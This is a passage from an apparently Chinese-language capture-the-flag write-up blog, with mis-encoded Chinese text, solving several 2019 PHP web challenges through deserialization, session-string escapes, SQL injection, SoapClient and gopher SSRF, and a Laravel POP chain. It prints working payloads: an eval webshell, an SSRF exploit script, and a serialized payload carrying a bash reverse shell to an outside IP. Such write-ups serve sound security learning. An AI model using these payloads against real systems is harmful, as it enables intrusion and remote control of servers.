mysqli_insert_id($con);</span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		<span class="keyword">return</span> $id;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">			<span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		<span class="keyword">echo</span> $content;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line">	<span class="keyword">protected</span> $ifview = <span class="keyword">True</span>; </span><br><span class="line">	<span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cc = serialize(<span class="keyword">new</span> helper());</span><br><span class="line"><span class="keyword">echo</span> bin2hex($cc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/70434879-68a66600-1ac0-11ea-9290-b5070cb2ea10.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70434993-af945b80-1ac0-11ea-9ae0-cc156bf7b1c2.png" alt="image"></p>
<h2 id="å®‰æ´µæ¯-2019-easy-serialize-php">å®‰æ´µæ¯ 2019 easy_serialize_php</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨phpinfoä¸­çš„<code>auto_append_file</code>æ‰¾åˆ°äº†d0g3_f1ag.php.</p>
<p>extract($_POST); å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´, å¯ä»¥æ‹¿ä»–æ¥è¦†ç›–sessionå˜é‡, ç„¶ååˆ©ç”¨é¢˜ç›®ä¸­çš„è¿‡æ»¤å‡½æ•°å·§å¦™è§£æè‡ªå·±çš„åºåˆ—åŒ–å­—ç¬¦ä¸²</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload : _SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line">ç»è¿‡åºåˆ—åŒ–ä¹‹å :</span><br><span class="line">a:1:&#123;s:7:&quot;flagphp&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</span><br><span class="line">ç»è¿‡è¿‡æ»¤å‡½æ•°ä¹‹å</span><br><span class="line">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</span><br><span class="line">æ­¤æ—¶&quot;;s:48&quot;æˆä¸ºäº†s:7çš„å€¼, æœ«å°¾çš„;&#125;è§£æå¤±è´¥ä¸å½±å“ç»“æœ</span><br></pre></td></tr></table></figure>
<p>ä»d0g3_f1ag.phpè¯»åˆ°äº†flagè·¯å¾„, ç„¶åå†ä¾æ³•ç‚®åˆ¶è¯»flagå³å¯.</p>
<h2 id="De1ta-ctf-2019-shellshellshell">De1ta ctf 2019 shellshellshell</h2>
<p>å¼€å±€æ‰«æå¹¶å¾—åˆ°äº†index.php~, config.php~, user.php~, ç­‰æºç , å…³é”®ä»£ç å¦‚ä¸‹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">config.php   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($columns,$table,$values)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $column = <span class="keyword">$this</span>-&gt;get_column($columns);</span><br><span class="line">        $value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br><span class="line">        $nid =</span><br><span class="line">        $sql = <span class="string">'insert into '</span>.$table.<span class="string">'('</span>.$column.<span class="string">') values '</span>.$value;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user.php</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">                $db = <span class="keyword">new</span> Db();</span><br><span class="line">                @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">                <span class="keyword">if</span>($ret)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'pic'</span>])) </span><br><span class="line">                &#123;</span><br><span class="line">                    $dir=<span class="string">'/app/upload/'</span>;</span><br><span class="line">                    move_uploaded_file($_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>],$dir.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>]);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>].<span class="string">"upload success');&lt;/script&gt;"</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è§‚å¯Ÿinsert å‡½æ•°å‘ç°ä»–ä¼šæŠŠä¸€å¯¹ä¸­é—´æ²¡æœ‰é€—å·çš„åå¼•å·è½¬ä¹‰æˆä¸€å¯¹å•å¼•å·, é‚£ä¹ˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1#` å°±ä¼šå˜æˆ (`1#``) ç„¶åå˜æˆ(&apos;1#&apos;`)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥é€ƒé€¸å‡ºæ¥äº†.</p>
<p>æ³¨å…¥ç‚¹åœ¨signature, æ˜¯äºŒæ¬¡æ³¨å…¥çš„æ‰‹æ³•</p>
<p>ä¸ºäº†èƒ½è®©æ³¨å…¥çš„ä¿¡æ¯æ­£å¸¸å›æ˜¾, æ³¨å…¥ä¸¤è¡Œæ•°æ®çš„æ—¶å€™è¦ä¿è¯ç¬¬ä¸€è¡Œçš„æ•°æ®ä¹Ÿæ˜¯æ­£å¸¸çš„å¦åˆ™ä¼šå› ä¸ºmoodå¯¹è±¡è§£æå¤±è´¥è€Œæ— æ³•å›æ˜¾.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70115181-e706a080-1699-11ea-91ac-f484008eed33.png" alt="image"></p>
<p>å¾—åˆ°å¯†ç ä¹‹åå°è¯•ç™»å½• , å‘ç°ç¦æ­¢äº†, åªå…è®¸æœ¬åœ°ç™»å½•, é‚£ä¹ˆå¯ä»¥è€ƒè™‘ssrf.</p>
<p>æ³¨æ„åˆ°payloadä¸­moodå¯¹è±¡æ˜¯ä¼šè¢«ååºåˆ—åŒ–å¤„ç†çš„, é‚£ä¹ˆå¦‚æœè¿™ä¸ªä½ç½®çš„å¯¹è±¡æ¢æˆsoapclient çš„è¯, å¯¹è±¡ååºåˆ—åŒ–æ—¶å€™å°±ä¼šè§¦å‘é­”æ³•æ–¹æ³•å»å‘èµ·è¯·æ±‚</p>
<p>ç”Ÿæˆä»»æ„æŠ¥æ–‡postçš„poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://123.206.216.198/bbb.php'</span>;</span><br><span class="line">$post_string = <span class="string">'a=b&amp;flag=aaa'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: xxxx=1234'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">'%0d%0a'</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'%26'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åè¿™æ ·æ“ä½œ</p>
<ul>
<li>å¼€ä¸¤ä¸ªç™»å½•é¡µé¢, ä¿è¯sessionidä¸åŒ</li>
<li>å…¶ä¸­ä¸€ä¸ªsession ç™»å½•å¹¶publishä¸€ä¸ªsoapclientå¯¹è±¡</li>
<li>soapclientå¯¹è±¡ååºåˆ—åŒ–å‘å†…ç½‘å‘èµ·è¯·æ±‚, è¯·æ±‚çš„å‚æ•°æ˜¯adminç”¨æˆ·åå’Œå¯†ç ä»¥åŠç¬¬äºŒä¸ªsessionå’Œç¬¬äºŒä¸ªsessionçš„éªŒè¯ç </li>
<li>ç„¶åå°†é¡µé¢åˆ‡æ¢åˆ°æ‹¥æœ‰ç¬¬äºŒä¸ªsessionçš„ç™»å½•ç•Œé¢, åˆ·æ–°ä»¥ä¸‹è¿™ä¸ªsessionå°±å¯ä»¥ä»¥adminèº«ä»½ç™»å½•äº†</li>
</ul>
<p>ç™»å½•ä¹‹åæ˜¯ä¸€ä¸ªä¸Šä¼ , ä¼ äº†ä¸ªshellæ‰«ä¸€ä¸‹å†…ç½‘, å‘ç°</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70115766-b0ca2080-169b-11ea-8f6d-ceab4d91b3bd.png" alt="image"></p>
<p>ä¸Šæµ·å¤§å­¦ç”Ÿçš„åŸé¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/var/sandbox/'</span> . md5(<span class="string">"prefix"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">    $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="comment"># filenameè¦å¾—æ˜¯æ•°ç»„</span></span><br><span class="line">    <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"try again!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">    $_ = $_POST[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_,$new_name)===<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can do it!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.cindemor.com/post/ctf-web-12.html" target="_blank" rel="noopener">https://blog.cindemor.com/post/ctf-web-12.html</a></p>
<p>gopheræ¥ssrfå‘åŒ…å…ˆç”¨shellå†™ä¸€ä¸ªs.phpæ–‡ä»¶è´Ÿè´£gopherçš„æ¥å—å’Œå‘é€</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>($url) &#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line">$co = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> $co;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payloadå¦‚ä¸‹, è¿™é‡Œçš„305.phpæ˜¯å·²ç»çˆ†ç ´å¾—åˆ°çš„æ–‡ä»¶åå­—, å®é™…ä¸Šè¿™ä¸ªpayloadåœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­ä¹Ÿåœ¨å†™shell , ä½¿ç”¨intruderåŠŸèƒ½åœ¨305 çš„ä½ç½®è¿›è¡Œçˆ†ç ´å°±å¯ä»¥å¾—åˆ°æ–‡ä»¶å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">command=<span class="string">"system('cat /etc/flag_is_He4e_89587236.txt');"</span></span><br><span class="line">exp=<span class="string">'''\</span></span><br><span class="line"><span class="string">POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 173.189.217.10</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Length: %s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="gml.php"</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@&lt;?php echo 1;@eval($_POST['gml']);?&gt;</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file[1]"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file[0]"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">php/.</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="hello"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">./305.php</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="gml"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------444980421912--</span></span><br><span class="line"><span class="string">'''</span>%(<span class="number">614</span><span class="number">-15</span>+len(command),command)</span><br><span class="line">tmp = urllib.quote(exp)</span><br><span class="line">new = tmp.replace(<span class="string">"%0A"</span>,<span class="string">"%0D%0A"</span>)</span><br><span class="line">result = <span class="string">"_"</span>+urllib.quote(new)</span><br><span class="line">result=<span class="string">"gopher://173.189.217.10:80/"</span>+result</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> requests.get(<span class="string">"http://db6b1032-7190-416f-a2a6-91c8d4c2c7a6.node3.buuoj.cn/upload/s.php?url="</span>+result).content</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019-laravel1">CISCN 2019 laravel1</h2>
<p>é¦–é¡µä»£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(\Illuminate\Http\Request $request)</span></span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">"payload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹æ ·å­æ˜¯æŠŠå‚æ•°payloadçš„å€¼ç›´æ¥ååºåˆ—åŒ–äº†,é‚£ä¹ˆå…³é”®æ˜¯æ‹¥æœ‰__destructé­”æ³•æ–¹æ³•çš„ç±»äº†.</p>
<p>ä¸‹è½½æºç .æºç å¾ˆå¤§å¾ˆå¤§,å‘ç°äº†æ—¥å¿—æ–‡ä»¶(æœ€ä¸‹é¢)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/66810943-c86e0e00-ef62-11e9-8804-f54dbe78fa59.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:6:&quot;_token&quot;;s:40:&quot;mg8pRdzQ1mQyQuhTbJV3KnfQl9zstzASDGOSzOuE&quot;;s:9:&quot;_previous&quot;;a:1:&#123;s:3:&quot;url&quot;;s:927:&quot;http://localhost/pop_chain/laravel/public/index.php/index?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bi%3A1%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A3%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A45%3A%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F115.159.184.127%2F9998%200%3E%261%22%3Bs%3A11%3A%22%00%2A%00poolHash%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22%00%2A%00expiry%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A2%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3Bs%3A54%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00poolHash%22%3Bs%3A1%3A%221%22%3B%7D%7D&quot;;&#125;s:6:&quot;_flash&quot;;a:2:&#123;s:3:&quot;old&quot;;a:0:&#123;&#125;s:3:&quot;new&quot;;a:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>å…³é”®ç±»æ˜¯<code>TagAwareAdapter</code> ,è¿™æ®µsessoinç›´æ¥æ”¹æ‰ä½¿ç”¨çš„è¯æˆ‘æ‰“ä¸å‡ºæ¥,ä¸è¿‡å¯ä»¥æ ¹æ®è¿™ä¸ªå»æ‰¾ç›¸åº”çš„popé“¾æ¡.</p>
<p>TagAwareAdapter.phpä»£ç (åˆ é™¤äº†å¤§éƒ¨åˆ†æ²¡æœ‰ç”¨çš„ä»£ç )</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">TagAwareCacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Nicolas Grekas &lt;p<span class="doctag">@tchwork</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span> <span class="keyword">implements</span> <span class="title">TagAwareAdapterInterface</span>, <span class="title">TagAwareCacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> TAGS_PREFIX = <span class="string">"\0tags\0"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $deferred = [];</span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line">    <span class="keyword">private</span> $setCacheItemTags;</span><br><span class="line">    <span class="keyword">private</span> $getTagsByKey;</span><br><span class="line">    <span class="keyword">private</span> $invalidateTags;</span><br><span class="line">    <span class="keyword">private</span> $tags;</span><br><span class="line">    <span class="keyword">private</span> $knownTagVersions = [];</span><br><span class="line">    <span class="keyword">private</span> $knownTagVersionsTtl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    __constructæ„é€ å‡½æ•°,å¯¹é¢˜ç›®æ²¡æœ‰å¸®åŠ©,å› æ­¤ç•¥è¿‡</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span><span class="params">(array $tags)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ok = <span 